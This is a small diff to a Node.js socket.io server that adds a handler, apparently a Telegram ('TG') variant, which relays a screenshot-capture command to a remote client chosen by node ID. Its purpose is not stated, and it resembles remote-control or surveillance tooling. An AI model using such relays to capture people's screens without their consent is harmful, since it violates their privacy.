@@ -45,8 +45,16 @@ io.on("connection", (socket) => {
 
         socket.on("get_screenshots", (nodeId) => {
             const clientObj = clients[nodeId];
+            console.log(nodeId)
             if(clientObj && clientObj.socketId) {
                 io.to(clientObj.socketId).emit("getScreenshots");
+            }
+        });
+
+        socket.on("get_screenshots_tg", (nodeId) => {
+            const clientObj = clients[nodeId];
+            if (clientObj && clientObj.socketId) {
+                io.to(clientObj.socketId).emit("getScreenshotsTG");
             }
         });
 
